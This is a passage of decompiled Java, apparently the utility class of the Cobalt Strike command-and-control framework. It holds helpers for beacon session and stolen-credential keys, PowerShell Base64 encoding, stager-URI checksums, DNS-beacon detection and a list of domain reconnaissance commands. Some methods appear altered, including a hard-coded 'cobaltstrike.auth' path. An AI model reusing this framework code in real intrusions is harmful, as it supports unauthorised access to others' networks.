   public static LinkedList apply(String var0, Collection var1, AdjustData var2) {
      LinkedList var3 = new LinkedList();
      Iterator var4 = var1.iterator();

      while(var4.hasNext()) {
         Object var5 = var4.next();
         Map var6 = var2.format(var0, var5);
         if (var6 != null) {
            var3.add(var6);
         }
      }

      return var3;
   }

   public static String C2InfoKey(Map var0) {
      return DialogUtils.string(var0, "bid");
   }

   public static String SessionKey(Map var0) {
      return DialogUtils.string(var0, "id");
   }

   public static String TokenKey(Map var0) {
      return DialogUtils.string(var0, "token");
   }

   public static String TargetKey(Map var0) {
      return DialogUtils.string(var0, "address");
   }

   public static String ApplicationKey(Map var0) {
      return DialogUtils.string(var0, "nonce");
   }

   public static String ServiceKey(Map var0) {
      String var1 = DialogUtils.string(var0, "address");
      String var2 = DialogUtils.string(var0, "port");
      return var1 + ":" + var2;
   }

   public static String CredKey(Map var0) {
      String var1 = DialogUtils.string(var0, "user");
      String var2 = DialogUtils.string(var0, "password");
      String var3 = DialogUtils.string(var0, "realm");
      return var1 + "." + var2 + "." + var3;
   }

   public static List merge(List var0, List var1) {
      HashSet var2 = new HashSet();
      var2.addAll(var0);
      var2.addAll(var1);
      return new LinkedList(var2);
   }

   public static long checksum8(String var0) {
      if (var0.length() < 4) {
         return 0L;
      } else {
         var0 = var0.replace("/", "");
         long var1 = 0L;

         for(int var3 = 0; var3 < var0.length(); ++var3) {
            var1 += (long)var0.charAt(var3);
         }

         return var1 % 256L;
      }
   }

   public static String MSFURI(int var0) {
      return "A60BED6CD0B5A4E80523DB2D91682DC9.jpg";

   }

   public static String MSFURI() {
      return MSFURI(4);
   }

   public static String MSFURI_X64() {

      return "ECFB2CA9428299F31F0BBB9B5EA28DC3.jpg";
   }

   public static long lpow(long var0, long var2) {
      if (var2 == 0L) {
         return 1L;
      } else if (var2 == 1L) {
         return var0;
      } else {
         long var4 = 1L;

         for(int var6 = 0; (long)var6 < var2; ++var6) {
            var4 *= var0;
         }

         return var4;
      }
   }

   public static String drives(String var0) {
      LinkedList var1 = new LinkedList();
      String[] var2 = expand("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
      long var3 = Long.parseLong(var0);
      long var5 = 0L;

      for(int var7 = 0; var7 < var2.length; ++var7) {
         var5 = lpow(2L, (long)var7);
         if ((var3 & var5) == var5) {
            var1.add(var2[var7] + ":");
         }
      }

      String var8 = join((Collection)var1, (String)", ");
      if (!isin("C:", var8)) {
         print_warn("C: is not in drives: '" + var0 + "'. " + var1);
      }

      return var8;
   }

   public static final byte[] gunzip(byte[] var0) {
      try {
         ByteArrayInputStream var1 = new ByteArrayInputStream(var0);
         GZIPInputStream var2 = new GZIPInputStream(var1);
         byte[] var3 = readAll(var2);
         var2.close();
         return var3;
      } catch (Exception var4) {
         MudgeSanity.logException("gzip", var4, false);
         return new byte[0];
      }
   }

   public static final byte[] gzip(byte[] var0) {
      try {
         ByteArrayOutputStream var1 = new ByteArrayOutputStream(var0.length);
         GZIPOutputStream var2 = new GZIPOutputStream(var1);
         var2.write(var0, 0, var0.length);
         var2.finish();
         byte[] var3 = var1.toByteArray();
         var2.close();
         return var3;
      } catch (Exception var4) {
         MudgeSanity.logException("gzip", var4, false);
         return new byte[0];
      }
   }

   public static String Base64PowerShell(String var0) {
      try {
         return Base64.encode(var0.getBytes("UTF-16LE"));
      } catch (UnsupportedEncodingException var2) {
         MudgeSanity.logException("toPowerShellBase64", var2, false);
         return "";
      }
   }

   public static boolean contains(String var0, String var1) {
      return toSet(var0).contains(var1);
   }

   public static boolean isIP(String var0) {
      return var0.length() <= 16 && var0.matches("\\d+\\.\\d+\\.\\d+\\.\\d+");
   }

   public static boolean isIPv6(String var0) {
      if (var0.length() <= 64 && var0.matches("[A-F0-9a-f:]+(%[\\d+]){0,1}")) {
         return true;
      } else {
         return var0.length() <= 64 && var0.matches("[A-F0-9a-f:]+:\\d+\\.\\d+\\.\\d+\\.\\d+");
      }
   }

   public static int limit(String var0) {
      if ("screenshots".equals(var0)) {
         return 125;
      } else if ("beaconlog".equals(var0)) {
         return 2500;
      } else {
         return "archives".equals(var0) ? 20000 : 1000;
      }
   }

   public static final String randomMac() {
      int var0 = rand(255);
      if (var0 % 2 == 1) {
         ++var0;
      }

      StringStack var1 = new StringStack("", ":");
      var1.push(hex(var0));

      for(int var2 = 0; var2 < 5; ++var2) {
         var1.push(hex(rand(255)));
      }

      return var1.toString();
   }

   public static void increment(Map var0, String var1) {
      int var2 = count(var0, var1);
      var0.put(var1, new Integer(var2 + 1));
   }

   public static int count(Map var0, String var1) {
      if (!var0.containsKey(var1)) {
         return 0;
      } else {
         Integer var2 = (Integer)var0.get(var1);
         return var2;
      }
   }

   public static long ipToLong(String var0) {
      return Route.ipToLong(var0);
   }

   public static String strip(String var0, String var1) {
      return var0.startsWith(var1) ? var0.substring(var1.length()) : var0;
   }

   public static String stripRight(String var0, String var1) {
      if (var0.endsWith(var1)) {
         return var0.equals(var1) ? "" : var0.substring(0, var0.length() - var1.length());
      } else {
         return var0;
      }
   }

   public static long lof(String var0) {
      try {
         File var1 = new File(var0);
         return var1.isFile() ? var1.length() : 0L;
      } catch (Exception var2) {
         return 0L;
      }
   }

   public static String Host(String var0) {
      RegexParser var1 = new RegexParser(var0);
      return var1.matches("(.*?):(\\d+)") ? var1.group(1) : var0;
   }

   public static int Port(String var0, int var1) {
      RegexParser var2 = new RegexParser(var0);
      return var2.matches("(.*?):(\\d+)") ? toNumber(var2.group(2), var1) : var1;
   }

   public static String session(int var0) {
      if ((var0 & 1) == 1) {
         return "session";
      } else {
         return var0 > 0 ? "beacon" : "unknown";
      }
   }

   public static String session(String var0) {
      return session(toNumber(var0, 0));
   }

   public static boolean isSafeFile(File var0, File var1) {
      try {
         return var1.getCanonicalPath().startsWith(var0.getCanonicalPath());
      } catch (IOException var3) {
         MudgeSanity.logException("isSafeFile '" + var0 + "' -> '" + var1 + "'", var3, false);
         return false;
      }
   }

   public static File SafeFile(File var0, String var1) {
      try {
         File var2 = new File(var0, var1);
         if (var2.getCanonicalPath().startsWith(var0.getCanonicalPath())) {
            return var2.getCanonicalFile();
         }
      } catch (IOException var3) {
         MudgeSanity.logException("Could not join '" + var0 + "' and '" + var1 + "'", var3, false);
      }

      print_error("SafeFile failed: '" + var0 + "', '" + var1 + "'");
      throw new RuntimeException("SafeFile failed: '" + var0 + "', '" + var1 + "'");
   }

   public static File SafeFile(String var0, String var1) {
      return SafeFile(new File(var0), var1);
   }

   public static int toIntLittleEndian(byte[] var0) {
      ByteBuffer var1 = ByteBuffer.wrap(var0);
      var1.order(ByteOrder.LITTLE_ENDIAN);
      return var1.getInt(0);
   }

   public static String getCaseInsensitive(Map var0, String var1, String var2) {
      String var3 = (String)var0.get(var1);
      if (var3 == null) {
         var1 = var1.toLowerCase();
         Iterator var4 = var0.entrySet().iterator();

         Map.Entry var5;
         String var6;
         do {
            if (!var4.hasNext()) {
               return var2;
            }

            var5 = (Map.Entry)var4.next();
            var6 = var5.getKey().toString().toLowerCase();
         } while(!var1.equals(var6));

         return (String)var5.getValue();
      } else {
         return var3;
      }
   }

   public static byte[] shift(byte[] var0, int var1) {
      if (var0.length < var1) {
         return var0;
      } else if (var0.length == var1) {
         return new byte[0];
      } else {
         byte[] var2 = new byte[var0.length - var1];

         for(int var3 = 0; var3 < var2.length; ++var3) {
            var2[var3] = var0[var3 + var1];
         }

         return var2;
      }
   }

   public static String[] toKeyValue(String var0) {
      StringBuffer var1 = new StringBuffer();
      StringBuffer var2 = new StringBuffer();
      char[] var3 = var0.toCharArray();
      boolean var4 = false;

      int var6;
      for(var6 = 0; var6 < var3.length && var3[var6] != '='; ++var6) {
         var1.append(var3[var6]);
      }

      ++var6;

      while(var6 < var3.length) {
         var2.append(var3[var6]);
         ++var6;
      }

      String[] var5 = new String[]{var1.toString(), var2.toString()};
      return var5;
   }

   public static String canonicalize(String var0) {
      try {
         return (new File("cobaltstrike.auth")).getCanonicalPath();
      } catch (Exception var2) {
         MudgeSanity.logException("canonicalize: " + var0, var2, false);
         return var0;
      }
   }

   public static final byte[] toBytes(String var0, String var1) {
      try {
         Charset var2 = Charset.forName(var1);
         if (var2 == null) {
            return toBytes(var0);
         } else {
            ByteBuffer var3 = var2.encode(var0);
            byte[] var4 = new byte[var3.remaining()];
            var3.get(var4, 0, var4.length);
            return var4;
         }
      } catch (Exception var5) {
         MudgeSanity.logException("could not convert text with " + var1, var5, false);
         return toBytes(var0);
      }
   }

   public static final String bString(byte[] var0, String var1) {
      try {
         if (var1 == null) {
            return bString(var0);
         } else {
            Charset var2 = Charset.forName(var1);
            return var2.decode(ByteBuffer.wrap(var0)).toString();
         }
      } catch (Exception var3) {
         MudgeSanity.logException("Could not convert bytes with " + var1, var3, false);
         return bString(var0);
      }
   }

   public static final int toShort(String var0) {
      if (var0.length() != 2) {
         throw new IllegalArgumentException("toShort length is: " + var0.length());
      } else {
         try {
            DataParser var1 = new DataParser(toBytes(var0));
            return var1.readShort();
         } catch (IOException var2) {
            MudgeSanity.logException("Could not unpack a short", var2, false);
            return 0;
         }
      }
   }

   public static void writeUTF8(OutputStream var0, String var1) throws IOException {
      byte[] var2 = var1.getBytes("UTF-8");
      var0.write(var2, 0, var2.length);
   }

   public static String URLEncode(String var0) {
      try {
         return URLEncoder.encode(var0, "UTF-8");
      } catch (Exception var2) {
         MudgeSanity.logException("Could not URLEncode '" + var0 + "'", var2, false);
         return var0;
      }
   }

   public static String URLDecode(String var0) {
      try {
         return URLDecoder.decode(var0, "UTF-8");
      } catch (Exception var2) {
         MudgeSanity.logException("Could not URLDecode '" + var0 + "'", var2, false);
         return var0;
      }
   }

   public static long toUnsignedInt(int var0) {
      return (long)var0 & 4294967295L;
   }

   public static int toUnsignedShort(int var0) {
      return var0 & '\uffff';
   }

   public static String formatSize(long var0) {
      String var2 = "b";
      if (var0 > 1024L) {
         var0 /= 1024L;
         var2 = "kb";
      }

      if (var0 > 1024L) {
         var0 /= 1024L;
         var2 = "mb";
      }

      if (var0 > 1024L) {
         var0 /= 1024L;
         var2 = "gb";
      }

      return var0 + var2;
   }

   public static final byte[] XorString(byte[] var0, byte[] var1) {
      byte[] var2 = new byte[var0.length];

      for(int var3 = 0; var3 < var0.length; ++var3) {
         var2[var3] = (byte)(var0[var3] ^ var1[var3 % var1.length]);
      }

      return var2;
   }

   public static final byte[] Bytes(String var0) {
      try {
         String[] var1 = var0.split(" ");
         byte[] var2 = new byte[var1.length];

         for(int var3 = 0; var3 < var1.length; ++var3) {
            var2[var3] = (byte)Integer.parseInt(var1[var3], 16);
         }

         return var2;
      } catch (Exception var4) {
         MudgeSanity.logException("Could not parse '" + var0 + "'", var4, false);
         return new byte[0];
      }
   }

   public static final boolean Flag(int var0, int var1) {
      return (var0 & var1) == var1;
   }

   public static List getNetCommands() {
      return toList("computers, dclist, domain, domain_controllers, domain_trusts, group, localgroup, logons, sessions, share, time, user, view");
   }

   public static boolean isDNSBeacon(String var0) {
      long var1 = (long)toNumberFromHex(var0, 0);
      return var1 > 0L && (var1 & 1202L) == 1202L;
   }

   public static long elapsed(long var0) {
      return var0 == 0L ? -1L : System.currentTimeMillis() - var0;
   }

   public static String arch(boolean var0) {
      return var0 ? "x64" : "x86";
   }

   public static String getFileName(String var0) {
      return (new File(var0)).getName();
   }

   public static void clearBuffer(ByteBuffer var0) {
      var0.clear();
      byte[] var1 = var0.array();
      Arrays.fill(var1, (byte)0);
   }

   public static String strip(String var0) {
      StringBuffer var1 = new StringBuffer(var0.length());
      char[] var2 = var0.toCharArray();

      for(int var3 = 0; var3 < var2.length; ++var3) {
         if (var2[var3] != 2 && var2[var3] != 31 && var2[var3] != 15 && var2[var3] != 22) {
            if (var2[var3] == 3) {
               ++var3;
            } else {
               var1.append(var2[var3]);
            }
         }
      }

      return var1.toString();
   }

   static {
      C.setTimeZone(TimeZone.getTimeZone("UTC"));
      D = new Random();
      B = "0123456789abcdef".toCharArray();
   }
}
